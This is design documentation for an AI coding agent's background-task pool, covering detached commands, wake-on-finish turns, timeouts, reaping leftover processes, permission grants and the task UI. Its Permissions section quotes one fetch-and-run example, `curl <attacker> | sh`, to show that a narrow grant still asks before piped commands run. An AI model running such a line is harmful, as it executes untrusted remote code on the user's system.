# Background tasks

`run_command` normally blocks the whole turn until the command exits, which makes the agent sit idle through builds, test suites, installs and batch downloads. A backgrounded call hands the command to a **session-scoped task pool** and returns a task id immediately, so the agent keeps working and collects the result later.

## Model-facing surface

| Tool | Purpose |
|---|---|
| `run_command` with `background: true` | Start the command detached; returns a `task_id` instead of output. |
| `background_list` | Every task of the session with status, elapsed time, and estimate. |
| `background_output` | Captured stdout and stderr, including while the task still runs (`tail_lines`, default 100). |
| `background_wait` | Block for a bounded stretch (default 60s, maximum 300s) and return the output once the task ends. |
| `background_stop` | Terminate a task and the whole process group it started, including one left behind by an earlier foxxycode run. |
| `background_reap` | Kill every background process of this session that outlived the foxxycode run which started it. |

Two extra `run_command` arguments drive the pool:

- **`background`** (bool) — run detached.
- **`expected_seconds`** (int) — the model's own estimate of how long the work takes. It is **advisory and nothing else**: it drives the status ticker the operator sees. Guessing low only marks the task **overdue**; it does not shorten the hard timeout and cannot kill the task.
- **`notify_on_finish`** (bool) — wake the agent when this task ends (see below).

**The model is told what still runs on every request.** A model starts a task, keeps working, and several steps later has to remember that the task exists - and that a server it started is still up when it writes its summary. The turn context block that closes every request ([Context compaction](compaction.md) keeps the system prompt frozen, so what moves travels after the history) carries a `## Background tasks` section with one line per running task of the session, in the wording of `background_list` (`bg_3 [running] make test (elapsed 2m5s, estimated 5m) silent for 1m10s`). It costs a line per task and saves the `background_list` call that was the only way to find out. Finished tasks and [system tasks](#system-tasks) are left out, and with `tools.background.enable: false` the section is not written at all (`backgroundTasksSection` in `internal/agent/turn_context.go`).

The prompt (`internal/prompts/agent.md`, and the plan-mode equivalent) tells the model when to background, to estimate honestly, to poll rather than busy-wait on `background_wait`, to stop servers and watchers it started, and to read the final status before summarising the outcome. Background execution is available in **both** agent and plan mode: a planner investigating a repo should not have to sit through a slow read-only command either.

## Waking the agent when a task finishes

A long job is only useful unattended if something restarts the conversation when it ends. A task started with `notify_on_finish: true` therefore begins a **new agent turn on its own** once it reaches a terminal state, so the model can end its turn the moment the work is handed off.

The opt-in is the point. The model decides which results are worth a turn, so a batch of quick commands cannot each spend one behind the operator's back; everything else simply lands in the history for the model to read later.

### Which process wakes the agent

Every process that runs turns attaches one waker to its task pool, under one **keyed** subscription (`bgtask.WakeWatcherKey`), so rebuilding a surface replaces the watcher instead of stacking another:

| Process | Where the woken turn runs |
|---|---|
| bare `foxxycode` (the console) | in the console, on its own UI goroutine, like a typed prompt: a gated tool opens the permission modal |
| `foxxycode acp` | through the manager, with the editor as the sender: the updates land in the thread the editor has open, and a gated tool is asked there |
| `foxxycode serve` | the surface that owns the session - the Telegram chat bound to it - or else the HTTP server, or, with neither up, the manager itself (see below) |
| `foxxycode -p`, a subagent, a scheduled run | nowhere: nothing will start the turn |

**The tool only promises what will happen.** `run_command` and `spawn_agent` ask the pool whether a waker is subscribed (`Pool.CanWake`) and whether the session can take a turn at all. Where it can, the result says *You will be woken with the outcome when it finishes* and the task records `notify_on_finish`; where it cannot, the result says that nothing will wake the model and names `background_list`, `background_wait` and `background_output` instead, and the task records no wake it would not get. A child's or a scheduled run's transcript is sealed when its turn returns, so a task started there never wakes anything.

### What the woken turn looks like

The woken turn starts from a plain statement of the outcome, which is what the model reads: every task with its id, status, label, exit code, runtime and any error, the tool that has the detail (`background_output`), and the reminder that a task which failed, timed out or was stopped did not succeed.

Nobody typed that message, and no surface shows it as if somebody had. The first message of a woken turn is persisted with a marker - `background_wake` in `messages.json` and in `GET /foxxycode/sessions/{id}/messages`, the tasks with their outcome - and the turn opens with a `background_wake` session update before the message is written, so a client that reloads between the two sees the wake once. As the turn begins, the pool marks its tasks as having woken the agent (`woke_agent` on the task row, kept in the task's record).

Where the task list sits next to the conversation, the woken turn shows nothing of its own and reads as the agent carrying on:

- **Web UI**: nothing stands where a user bubble would, and the answer follows the previous turn; the task's card keeps its bell ([Which tasks wake the agent](#which-tasks-wake-the-agent)). The wake still counts as a turn: an edit of a later message and a branch after it are numbered the way the server numbers them, and a failed woken turn offers no retry, since there is nothing typed to send again.
- **Console**: the same, live and when `/resume` replays the session; the task's row in `/tasks` says `woke the agent`.

The text-only surfaces have no task list beside the chat, so a line says what woke the agent, the outcome in words:

- **ACP**: the `background_wake` session update, followed by a quoted line of agent text for an editor that renders only the standard updates, *Woken by a finished background task: bg_3 make test, failed, exit 2, 1m 30s*; `session/load` replays it the same way.
- **Telegram**: a message of its own above the answer, *🔔 Woken by a finished background task: bg_3 make test, failed, exit 2, 1m 30s*.

### Under `foxxycode serve`

The process owns the waker (`serve.Runtime`), whichever surfaces are enabled, and a woken turn goes to the surface that should run it:

1. **The Telegram chat bound to the session.** The turn runs exactly like a message the person sent: the chat's own sender, mirrored into the HTTP relay so a browser watching the session follows it. The chat receives the line about the wake and then the answer, whether or not the HTTP server is running. Permission semantics are the chat's: the chat's agent is allowed what it asks, a subagent is asked about in the chat.
2. **The HTTP server.** The turn runs through the session's composer relay, so the web UI and a console attached over `--remote` follow it. Its permission prompts are **asked**, not refused: the prompt goes to the relay and is persisted as the session's pending prompt, the web UI shows it (and restores it after a reload), a following console shows it in its modal, and the first answer through `POST /foxxycode/sessions/{id}/permission` settles it. It waits the way the prompt of a browser turn whose tab was closed waits. A question inside a woken turn is still refused: nothing persists one for a client that arrives later.
3. **Nobody.** With neither surface up - a `foxxycode serve` running only its scheduler, or a bot whose chat has moved to another session - the runtime still runs the turn it promised, through the manager, and the transcript keeps the outcome for whoever opens the session next. A gated tool call inside it is **denied** unless `tools.permission_mode` is `bypass`: no surface can answer.

`GET /foxxycode/events` announces a woken turn as `background_wake`, with the tasks. A console attached over `--remote` reads only the turns it starts, so this is how it learns there is one worth following: it attaches to the session's composer relay and renders the turn - the answer, and a permission prompt, which it withdraws again if the web UI answers first. A console that opens the session while such a turn is already running - it was closed when the task ended - learns it from `GET /foxxycode/sessions/{id}/activity` (`backgroundWake`) and follows the turn from where the transcript it loaded ends, so a prompt that waited for somebody is answered there; after a dropped connection the snapshot of the events stream announces the wake again, and the console picks the same turn up after the last frame it showed.

### Timing and limits

- **Tasks finishing together cost one turn.** A short settle window batches a burst, so three results arrive as one turn with three lines instead of three turns.
- The turn takes the **composer turn lock**, which refuses rather than queues: a session with a turn already in flight answers `ErrSessionTurnBusy` at once. Waiting is therefore the waker's job - it **retries the same batch** (1 s, doubling to a 15 s ceiling) until the session goes idle, and only then starts the turn. The HTTP server takes the lock before it registers the woken turn's relay, so a refused attempt never cuts the watchers of the turn that is running.
- **A task that dies inside its own turn is still reported.** This is the ordinary case, not an exotic one: the model starts a task, keeps talking, and anything that fails in the first seconds finishes while the launching turn is still open. The outcome waits for that turn and arrives after it, rather than being dropped. Anything that finished during the wait joins the same batch, so a long turn still costs one wake. A session whose turn never ends gives up after 30 minutes and logs `background_wake_abandoned`; every other turn failure is logged as `background_wake_failed` and not retried, because it would only spin.
- **A woken turn is watchable.** It publishes the same SSE a composer turn does, through the session's composer relay, so `GET /foxxycode/sessions/{id}/composer-stream` streams it and a chat open on that session follows it live. Without that the one turn nobody requested over HTTP produced no stream at all: the session read as busy with nothing to attach to, and the UI sat on a status line built from the transcript as it stood before the wake until it gave up. The relay is taken only **after** the turn lock is won — registering one closes any relay the session already has, and a waiting wake must not cut a watching chat off from the turn it is following.
- **Permission prompts remain answerable.** An HTTP wake publishes them on the composer relay and persists the pending prompt, so a watching browser or remote console can answer. Questions are refused because there is no durable answer route for them. If no interactive surface is available, the configured permission policy applies.
- **The console holds a wake for a session it is not showing.** A task of a session the operator left with `/new` or `/resume` waits for them to come back to it - the waker's busy retry - and the console says once where it is waiting.
- **Shutdown does not wake anything.** Drain stops running tasks, and a stop is terminal; without that guard every task killed by shutdown would start a turn nobody will read.
- A woken turn can start another notifying task, which is a legitimate pattern for unattended work and also a way to burn a night of tokens on a loop. `maxWakesPerSession` (50 per process, `internal/agent/background_notify.go`) is the backstop; reaching it stops starting turns and logs `background_wake_capped`. The budget counts turns that actually ran - an attempt refused by a busy session or by shutdown is refunded, so waiting out one long turn cannot exhaust it.

### Which tasks wake the agent

A running task that will start a turn when it ends says so everywhere it is listed: a **bell** after its title on its card in the Tasks panel (hover: *Wakes the agent when it ends*), `wakes the agent` in its row of the console's `/tasks`, and `wakes you when it ends` in `background_list` and in the turn context, so the model does not spend a turn waiting on a task it will be woken for.

A finished task keeps the mark when its end did start a turn: the bell stays on its card (hover: *Woke the agent when it ended*) and its row in `/tasks` says `woke the agent`. The web UI and the console tell what woke the agent there, since the woken turn itself shows nothing. A task that was to wake the agent and has not - the turn has not begun yet, or never will because the process went away - carries no mark once it has ended.

![The Tasks panel with a bell on the running build, which will wake the agent, and on the failed test run, which did](../assets/background-tasks/background-tasks-wake-bell-dark-1280.png)

*The failed test run woke the agent, and the transcript simply carries on with its answer; the build still running will wake it again*

Implementation: `internal/agent/background_notify.go` (`BackgroundWaker`, `Wake`, `WakeInstruction`), `internal/serve/wake.go` (the process owner under `foxxycode serve`), `Server.RunBackgroundWake` (`external/httpserver/background_http.go`), `Bot.RunBackgroundWake` (`external/gateway/telegram/wake.go`), `App.attachBackgroundWaker` (`external/cli/background.go`), `acpWakeRunner` (`cmd/foxxycode/acp_wake.go`) and the follower of `internal/remote/follow.go`. Design record: `docs/plans/background-wake.md`.

- The HTTP composer relay lets a watching browser or remote console answer a woken turn's permission prompt. A pending permission survives a browser reload while the server process remains active.

## Timeouts

A task's hard limit is resolved in this order:

1. an explicit `timeout_seconds` wins, including a deliberately tight one;
2. otherwise a command with **no natural end** — a dev server, a watcher, a daemon — gets **no hard timeout at all** and is ended with `background_stop`;
3. otherwise `tools.background.default_timeout_seconds` (900s).

`expected_seconds` deliberately plays no part. It used to buy the timeout (3× the
estimate), which punished exactly the work an estimate cannot describe: `yarn serve`
estimated at an honest 30s was terminated 90 seconds in, and by the time the browser
tool was allowed to navigate, the port was dead. A low estimate must never be more
dangerous than no estimate.

Detection of endless work is deliberately narrow (`internal/tools/shell/longrunning.go`):
package-runner subcommands (`serve`, `dev`, `start`, `watch`, `preview`, `server`),
binaries that only ever keep running (`vite`, `nodemon`, `air`, …), an explicit
`--watch` flag, and `docker compose up` without `-d`. A false positive only means the
task runs until it ends or is stopped; a false negative kills a dev server, so the
list favours certainty.

The result is capped by `tools.background.max_timeout_seconds` (3600s). Hitting the limit terminates the process group and records the task as `timed_out` — that is a failure, not a success, and the model is told to report it as one.

An **adopted** task (see below) is the one case with no caller-supplied limit: it gets `max_timeout_seconds` outright. It has no estimate behind it, and the one number that must never be reused is the foreground timeout it just outlived — an explicit `timeout_seconds` wins verbatim, so passing the expired value would kill the task in milliseconds.

## Adoption: a foreground command that outlives its timeout

A foreground `run_command` waits 30 seconds by default. Killing whatever is still running at that point is wrong twice over: a dev server or watcher is doing exactly what was asked, and anything the shell spawned survives a kill aimed only at the shell while still holding the inherited output pipe — which used to wedge `cmd.Wait` forever and hang the whole turn.

So the command is **handed to the pool instead of killed**. The process keeps running in the same process group, its output stream is redirected into the task's sink with everything captured so far flushed in first, and the tool answers with:

```
Command still running after 30s. It was NOT cancelled: it now runs as background task bg_3 (hard timeout 1h).
Follow it with background_output task_id="bg_3", background_wait, or terminate it with background_stop.
Do NOT run this command again with a larger timeout_seconds: it is already running, and a second copy would fight the first one for the same ports, locks and files.
Output captured so far:

  App running at:
  - Local:   http://localhost:8081/
```

The notice leads and the output follows, because the tool output ceiling truncates from the end. The result is a normal tool result, not an error: the agent loop shows the model an error's text and discards the result string, so reporting a timeout as an error is what threw the captured output away.

From there the task is an ordinary one — `background_list`, `background_output`, `background_wait`, `background_stop` all reach it, `notify_on_finish` is off (the model is being told right now), and its elapsed time counts from the original foreground start rather than from the handover.

The command **is** terminated, process group and all, in the three cases where nothing can take ownership: the turn was cancelled, no pool is wired, or the pool refused (`tools.background.enable: false`, session at `max_concurrent`, process draining). The answer then names the exact reason and points at `background: true`.

Implementation: `Pool.Adopt` (`internal/bgtask/pool.go`) shares the single scheduling path with `Pool.Start`; the shell side is `startForeground` and `adoptedHandle` in `internal/tools/shell/foreground.go`, with `switchWriter` holding the output until the pool takes it over. Exactly one `cmd.Wait` exists per command — the pool observes the same result rather than calling it again.

Known limitation: an adopted command keeps writing through the pipe `exec` created for the foreground run, and that pipe is drained only until `cmd.Wait` returns. If the command detaches a daemon and its shell then exits, `WaitDelay` closes the pipe five seconds later and the task is recorded as finished with the shell's exit code — the daemon keeps running, but whatever it prints after that point is lost. The trade is deliberate: without `WaitDelay` the wait would hang on the inherited pipe exactly the way the original bug did. Commands that keep their server in the shell's foreground — which dev servers do by default — are unaffected.

## Output is sanitised on read

Captured bytes are stored raw in `output.log`; escape sequences and carriage-return progress redraws are stripped when the output is **read** (`platform.SanitizeOutput`, applied in `bgtask.decodeOutput` and by `run_command` itself). A webpack or vue-cli build otherwise spends most of its output on `\x1b[2K\x1b[1A` redraws, and the line that matters is buried in them. Stripping at read time keeps the on-disk log a faithful record and avoids corrupting escape sequences that straddle two writes.

## Lifecycle and persistence

The pool lives **inside the running `foxxycode` process**. Each task mirrors its metadata and captured output into the session bundle:

```
<sessionDir>/background/<task_id>/meta.json
<sessionDir>/background/<task_id>/output.log
```

`meta.json` also carries the process-group leader pid and, on Windows, its exact
OS creation time as `process_started_at`. That identity is private persistence
metadata rather than part of the HTTP task row: it exists only so a later
foxxycode can prove that a reused pid does not belong to a different process.

The in-memory output window is bounded (`tools.background.output_buffer_bytes`, 256 KiB) so a chatty task cannot grow without limit; the log on disk keeps everything. Reading a persisted log back is capped at its last 256 KiB, so a watcher left running for a day cannot be pulled into memory wholesale — the response flags the truncation.

- **Server drain** and **session delete** terminate every running task of the affected scope, so shutting foxxycode down does not leave orphaned shell trees behind.
- **After a restart**, a task recorded as still in flight is reported as **`orphaned`** rather than as running forever. The correction is derived on every read and deliberately **not** written back: the HTTP list is polled, and rewriting would clobber the metadata of tasks still running in this process and race the supervisor's own write of the same file. The id counter resumes past whatever the bundle already holds, so a new task never overwrites the log of an identically named one from the previous process.

Statuses: `queued`, `running`, `succeeded`, `failed`, `timed_out`, `stopped`, `orphaned`.

## Stuck and leftover processes

Two different problems, with two different answers.

**Stuck**: a task that is running but doing nothing. There is no way to know that from the outside, so the pool reports the only fact it has — how long the task has produced no output. `background_list` marks a running task `silent for …` after a minute of quiet. It is a hint, not a verdict: `sleep`, a dev server and a watcher are all supposed to be silent. The model reads the command, decides, and calls `background_stop`. The hard timeout is still the backstop for anything nobody looks at.

**Leftover**: a process that outlived the foxxycode run which started it, because that run was killed rather than drained. The task record persists the **process group leader pid**, so a fresh foxxycode can tell a record whose processes are gone (reported `orphaned`) from one whose processes are still on this machine. `background_list` marks those `still alive from an earlier run`, `background_stop` reaches one by id, and `background_reap` kills all of them for the session at once.

Only a record that still claimed to be **running** when its process died is ever a reaping candidate. A task that finished normally leaves a stale pid, and the OS reuses pids — acting on one would kill an unrelated process.

The probe behind that has to answer **"is this task's process still running"**, not "does something answer to this number", and the two platforms need different work to get there:

- On unix, signalling **process group** `-pid` is already both checks at once: an exited task leaves an empty group (`ESRCH`), and a recycled pid only matches if it also leads a group, which narrows reuse a long way without closing it. Checking the leader's start time instead would open a worse hole — the group outlives its leader, and a leader that exited while its children kept running is exactly the survivor worth finding.
- Windows has no comparable group probe, and the obvious substitute — opening the process by pid — is wrong in both directions. A process **object** outlives the process itself for as long as anybody holds a handle to it (and `os.FindProcess` opened one per probe, so probing was itself what kept a corpse resolvable); and opening by number matches **any** process, with no group-leader requirement to filter out pid reuse. So the Windows probe asks `WaitForSingleObject` with a zero timeout, which distinguishes a running process from a retained corpse, and then requires its exact **creation time** to equal the `process_started_at` captured from Windows when the task launched. A missing or unreadable identity fails closed.

Proving the identity and then killing by number would still leave a window between the two, so on Windows the kill re-opens the pid, re-checks the creation time, and **holds that handle open for the whole of `taskkill`**. Windows keeps a pid allocated while any handle to its process object is open, so nothing can inherit the number in between — and `taskkill /T` still resolves the children that name it as their parent. Liveness is deliberately not required there: a leader that already exited can have running children, and those are the point.

The grace bounds how long the **target** may take to die, not how long `taskkill` may run, and the kill is confirmed with the liveness probe before it reports success. Conflating the two is a bug this code has already had: `taskkill.exe` cold-starting under load routinely needs more than a second, the helper was cut short, and the caller was told the group was gone while it went on holding its port. Both platforms now return an error rather than a false success when the process outlives the kill.

That comparison is why reaping never needs a fresh pid from the operator: the record carries everything needed to prove the pid still means what it meant.

**Upgrading**: records written before `process_started_at` existed carry a pid and no identity. On Windows they can no longer be proven, so they are not listed as leftovers and `background_reap` will not touch them — the fail-closed side of the same rule. If such a run really did leave a process behind, kill it from the OS and delete the stale session bundle. Unix is unaffected: its probe never consumed the identity.

There is deliberately **no** tool that kills an arbitrary pid. `run_command` can already run `kill`, and it goes through the permission gate; a dedicated tool would route around that.

## Permissions

A backgrounded command goes through the same permission gate as a foreground one — backgrounding is not a way around approval. Because a batch of calls that differ only in their arguments would otherwise ask once per call, the dialog offers a fourth choice next to **Allow** / **Allow always** / **Reject**:

**Always allow `<program>`** widens the grant from the exact command to the program itself. The button names the exact allowlist entry that will be stored, so the operator approves the string that is actually saved:

- `curl -s https://example.com/a` → grants **`curl`**, which then covers `curl` with any arguments;
- `git status --short` → grants **`git status`**, because for multiplexers (`git`, `go`, `npm`, `docker`, `make`, `kubectl`, …) the first argument selects what actually happens; `git push` still asks.

Widening is offered **only** for a single plain invocation. Anything carrying shell metacharacters (`| & ; < > $( ) backtick * ? [ ] { } ! # ~ % @`, a newline) or a leading `VAR=` assignment keeps the narrow grant. `Allow always` keeps its original meaning; the wider grant is never implied.

Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps its documented prefix meaning.

## HTTP surface

| Method | Path | Purpose |
|---|---|---|
| `GET` | `/foxxycode/sessions/{id}/background-tasks` | Task rows plus a `running` count. |
| `GET` | `/foxxycode/sessions/{id}/background-tasks/{task_id}` | One task with its captured `output` (optional `?tail=N`). |
| `POST` | `/foxxycode/sessions/{id}/background-tasks/{task_id}/stop` | Terminate the task; returns the final row and output. |

Rows carry the raw snapshot plus server-computed `elapsed_seconds`, `overdue`, and `running`, so every client agrees on the clock arithmetic. Tasks recorded by an earlier process are merged in from the session bundle as `orphaned`.

The SPA **polls** these endpoints rather than listening on SSE: a background task outlives the stream of the turn that started it. Cadence is 2.5s while anything runs and 15s otherwise.

## UI

The panel is **docked inside the session**, to the right of the transcript, at `#/s/<sessionId>/tasks` (and `#/s/<sessionId>/tasks/<task_id>` for one task). The route carries the chat, so a reload restores both the conversation and the panel. That placement is the answer to "which session spawned this process": the panel is part of the conversation that started the tasks, so there is nothing to label.

- **Every task is the same card**, whatever it is and whether it runs or has finished: a status dot, a **tag** that says what stands behind it (`shell` for a command, the agent's name for a subagent run, `memory` for the memory run of a turn), the title - the command, or what the agent was asked to do - and a line under it: elapsed against the estimate while it runs, how long it ran and when it ended afterwards (`20s · 12:50`). How the task ended is the dot's colour; the card says it in words only when opened. A subagent run, a scheduled run and the memory run also name, on the right of that line, the model they run on and the tokens their calls have spent (`qwen3.8-27b · 212k tokens`), updated while they run; hovering the card shows the full model id and the input and output tokens apart. A running card adds a Stop control, a **bell** after the title when the task will wake the agent when it ends (hover: *Wakes the agent when it ends*) and, **only** when the model supplied an estimate, a progress bar; a finished card keeps the bell when its end did wake the agent (hover: *Woke the agent when it ended*). Running tasks stand at the top of the panel under no heading; anything above the **Finished N** counter is running.
- **A click anywhere on a card opens it in place.** There is no second pane: the open card shows the command with a copy button (or **Show transcript** for an agent run), the error if the run ended with one (not the bare `exit status 2` of a command, which only repeats the exit code), the captured output in a box that scrolls on its own, and at the bottom how the task ended, its exit code and how long it ran (`Failed · Exit code 2 · Duration 10s`). Open as many cards as you like: each keeps reading its own output while its task runs. Which cards are open is not part of the address, which says only that the panel is showing.
- **Finished N** is a counter, not a list. Expanding it shows the finished cards; the rest stay on disk. That is how "keep every log" and "do not load the app" hold at once: the list is counted, the cards render on demand, and a task's output is fetched only when its card is opened.
- **Clear** drops the finished history for this session (`DELETE /foxxycode/sessions/{id}/background-tasks`). Running tasks are untouched.
- Ordering is **purely by start time**, newest first, among the live cards and inside the finished history alike. Running tasks are not floated to the top of the history: they stand above the counter already, and mixing two orderings makes a list that never sits still to read.
- The **opener** is the **Tasks** control at the right edge of the chat header. The header is sticky, so the control does not scroll away with the transcript, and it is there from the first message: a chat that has not run a task reads `Tasks`, one that has reads how many run out of how many there are (`Tasks 1 / 3`, then `Tasks 0 / 3` once everything has finished). A click opens the panel and a second one closes it. While a turn runs, the [live status line](../surfaces/web-ui.md#live-status-next-to-the-typing-dots) names the running tasks as well, and the name is a button to the same panel. Neither number counts [system tasks](#system-tasks), so the memory run of every turn does not read as a task the model started. The control is deliberately not in the nav rail: background tasks belong to one chat.

![The Tasks panel opened from the control in the chat header: two running cards, and a finished command opened in place](../assets/background-tasks-header-opener-dark-1280.png)

*The Tasks panel opened from the control in the chat header: a subagent and a command still running, and a finished build opened in place with its command, output and exit code*
- A transcript tool row that started a task names itself a background run and shows the task's clock where an ordinary row shows its duration, plus **Open in Tasks** and **Stop** when expanded. It says nothing about how the run ended: the status, the estimate, the exit code and the error are read on the task's card in the panel, which is what **Open in Tasks** opens: the panel comes up with that card already open.

- A turn the agent was woken into shows nothing of its own, neither a user bubble nor a note: the answer follows the previous turn, and the bell on the task's card says what woke the agent ([Waking the agent](#what-the-woken-turn-looks-like)).

Layout, colour, and mobile contracts are in `DESIGN.md` (**Background tasks panel**, **Background task on a transcript row**, **Woken turn**).

## In the console

The agent reaches the pool through its tools; the operator reaches it with `/tasks`, which opens the session's tasks in the place of the editor ([Console](../surfaces/console.md#commands-and-keys)). A row says the same three things a card of the web UI says - the tag (`shell`, the agent's name, `memory`), the title, how the task is going - in the same order, newest first. **enter** opens a task: the command, the child session of an agent run, the error it ended with, the last lines of the output, read again while the task runs. **s** stops a running task and everything it started, **r** reads again, **escape** steps back.

While a turn runs the status line counts the running tasks (`2m 05s · 1.2k tokens · 1 running task · Responding`), and once the turn has ended the footer keeps the count with the command that lists it (`1 task running (/tasks)`), because a background task outlives the turn that started it. Neither count includes [system tasks](#system-tasks).

The console reads the tasks through three methods of its backend: `session.Manager` answers from the pool of this process and from the bundle of an earlier one (`bgtask.Pool.SessionTasks`, the same read the HTTP rows use), and under `--remote` `remote.Handler` answers from the three REST routes above, so the overlay lists and stops the processes of the server the agent runs on. An unreachable server keeps the last rows on screen: unreachable is not "no tasks".

## Configuration

See `tools.background` in `docs/reference/config.md`:

```yaml
tools:
  background:
    enable: true
    max_concurrent: 5
    default_timeout_seconds: 900
    max_timeout_seconds: 3600
    output_buffer_bytes: 262144
```

Setting `enable: false` removes the `background` option from `run_command` and does not register the background tools at all. Subagent runs (`docs/features/subagents.md`) live in the same pool, so `max_concurrent`, `max_timeout_seconds` and `output_buffer_bytes` bound them too; `subagents.*` adds the process-wide cap on child runs, the nesting depth and the default run timeout.

## System tasks

A task the runtime starts on its own behalf, today the memory subagent of a user turn ([Long-term memory](memory.md)), is a `kind: agent` task whose `agent` object carries `system: true`. It is admitted past `tools.background.max_concurrent` and never counted toward it, because that cap bounds the work the model starts and a run per turn would refuse the model's next command; the model-facing tools (`background_list`, `background_output`, `background_wait`, `background_stop`) omit it and refuse its id, while the REST rows and the Tasks drawer show it, its card tagged `memory`. Drain stops it like any task, after a grace for a run that is still persisting.

## Subagent runs

The pool deliberately knows nothing about shells. What a task *is* comes from whoever starts it: the `CommandRunner` for a shell command, or a launch callback for work the pool cannot describe as a command:

```go
type Handle interface {
	Wait() (exitCode int, err error)
	Stop(grace time.Duration) error
	PID() int
	ProcessStartedAt() time.Time
}

type LaunchFunc func(taskID string, out io.Writer) (Handle, error)
```

A **subagent run** (`docs/features/subagents.md`) is a task of kind `agent`, started through `Pool.Launch(spec, launch)`. `Launch` shares the single scheduling path with `Start` and `Adopt`: admission (the per-session limit, drain) happens first, so `ErrPoolFull` or `ErrDraining` guarantees the callback never ran and nothing was created; then the pool assigns and registers the task id and only then calls back with that id and the task's output sink, so the child session is created knowing which task it belongs to. The callback returns a `Handle` whose `Stop` cancels the child's context and whose `Wait` blocks until the run settled. `PID` is 0 and `ProcessStartedAt` is the zero time, which is why the survivor probe never mistakes such a task for a pid it may kill.

What that changes on the surface:

- `Spec.Agent` and `Snapshot.Agent` carry the agent identity, serialised as `"agent": {"name": "…", "session_id": "sess_…"}` on the task row, in `GET .../background-tasks` and in the persisted `meta.json`. The child session id is generated before the pool is involved, so the first snapshot ever published already carries it. Without an explicit label the row reads `agent <name>`; the runtime sets `agent <name>: <description>`.
- The output log is the child's progress: one `[assistant]` line per line of assistant text, `→ tool` on start, `✓` / `✗ tool` on finish, and a closing block starting with `=== subagent report ===` that carries the outcome, the turn count, the duration and the child's final message. `background_output` and `background_wait` return it like any other log.
- **Stop cancels the child.** `background_stop`, the panel's Stop control, `POST .../stop`, session delete and server drain all go through the handle, which cancels the child's turn; the pool waits for the run to settle before it reports `stopped`.
- The card of the run carries the agent's name as its tag, and once opened offers **Show transcript**, which routes to the child session (`#/s/<child id>`), a read-only transcript that stays out of History. A shell task has no transcript: its open card shows the output text.
- **A detached child that needs a permission answer asks in the parent chat.** Once the spawning turn has ended there is no chat stream left to carry the prompt, so under `foxxycode serve` with the HTTP surface it is attached to the running agent row as `pending_permission` (the payload of the SSE `permission` event, with the **child** session id, plus `parent_session_id`, `task_id`, `agent_name` and `asked_at`) and announced on `GET /foxxycode/events` as `subagent_permission`. The web UI shows it at the end of the parent session's chat with the prompt's preview and its **Allow** / **Reject** buttons, which answer `POST /foxxycode/sessions/{child}/permission`; the same prompt reaches a console attached over `--remote` and, for a Telegram session, the chat. The waiting task keeps running and keeps its timeout, and the drawer keeps its fast poll cadence; nothing about the prompt is persisted. See `docs/features/subagents.md` (Detached runs).
- The run is a task of the **parent** session, so it counts against the parent's `max_concurrent` like a background command. Work the child starts itself (a backgrounded `run_command`, a grandchild) is registered under the **child's** session id and persisted in the child's bundle; it is stopped and awaited before the child is retired. The number of child LLM loops the whole process may run at once is a separate, process-wide cap, `subagents.max_concurrent`.

Everything else in this document applies unchanged: timeouts (the run arrives with an explicit `TimeoutSeconds` resolved by the runtime and is capped by `max_timeout_seconds` like any other task), persistence, drain, orphan marking after a restart, and the HTTP surface.

A **scheduled run** ([Scheduler](../operate/scheduler.md)) is the same kind of task under a **job session** instead of a chat: the scheduler's runs panel is this panel docked in the scheduler drawer, polling `GET /foxxycode/sessions/{job session}/background-tasks`, and its Clear goes through `DELETE /foxxycode/scheduler/jobs/{job_id}/runs` so the run transcripts go with the task records. When a child or a scheduled run is retired, its own finished tasks leave the pool's memory (`Pool.ReleaseSession`) while the records stay in its bundle; the scheduler's retention drops older runs one at a time (`Pool.Forget`).

## Tests

- Happy paths are Gherkin specs run by godog: `features/background_tasks.feature` (pool behaviour through the tools, `internal/tools/shell/bdd_background_test.go`), `features/background_reap.feature` (leftovers from an earlier run, `internal/tools/shell/bdd_background_reap_test.go`, which abandons a real second pool over the same bundle rather than stubbing the restart), `features/background_tasks_http.feature` (REST surface, `external/httpserver/bdd_background_test.go`), `features/background_permissions.feature` (the program-wide grant, `internal/permission/bdd_background_permissions_test.go`), and `features/foreground_timeout_adoption.feature` (handover of a foreground command that outlives its timeout, `internal/tools/shell/bdd_foreground_timeout_test.go`).
- The openers of the panel in the web UI are specified in `features/background_tasks_web_ui.feature` and the running-task segment of the live line in `features/turn_progress_web_ui.feature` (`external/ui/bdd_turn_progress_ui_test.go`, each step one named vitest test).
- The running-tasks section of the turn context is pinned in `internal/agent/turn_context_tasks_test.go`: a running task is listed the way `background_list` lists it, a system task and another session's task are not, a stopped task leaves the block, and nothing is written with background runs switched off.
- Edge cases live in ordinary unit tests: timeout resolution, the concurrency cap, output-window truncation, orphan marking, id uniqueness across restarts (`internal/bgtask`), grant refusal for metacharacters (`internal/permission`), and the UI helpers (`external/ui/src/ui/tasks/`).
- The liveness probe has its own tests in `internal/platform`: `procgroup_test.go` for what both platforms owe (a running process is found, an exited one is not, probing is repeatable), and `procgroup_windows_test.go` for what only Windows can get wrong — reporting a killed process alive because its handle is still open, accepting a creation time the record does not describe, and killing a pid on such a record. Reading a bundle written before `process_started_at` existed is pinned in `internal/bgtask` (`TestLoadPersistedLeavesALegacyRecordWithoutAProcessIdentity`).
- Subagent runs on the pool are specified in `features/subagents.feature` (`internal/agent/bdd_subagents_test.go`), `features/subagents_http.feature` (`external/httpserver/bdd_subagents_test.go`, including a detached prompt announced on the events stream and answered through the child session), `features/subagents_detached_prompts.feature` (`internal/serve`) and `features/subagents_web_ui.feature` (the prompt answered in the parent chat); `Pool.Launch` ordering and `Snapshot.Agent` persistence are unit tests in `internal/bgtask`. See `docs/features/subagents.md`.
- The console side is specified in `features/cli_tui.feature` (the overlay over a real pooled command: list, output, stop; the status line's turn numbers) and `features/cli_remote.feature` (the same overlay and the `turn_progress` line against a fake remote server), with the overlay's rendering and keys, the running count and the poll cadence in `external/cli/tasks_test.go`. `examples/cli/capture_tasks.py` drives the real binary in a pty against a scripted model and renders the captures of this page and of the console guide.
- End-to-end against a real model: `examples/httpserver/http_e2e_background.py`, `examples/httpserver/http_e2e_background_reap.py` (kills its own foxxycode mid-task and makes a fresh one clean up after it), and `examples/acp/acp_e2e_background.py`.
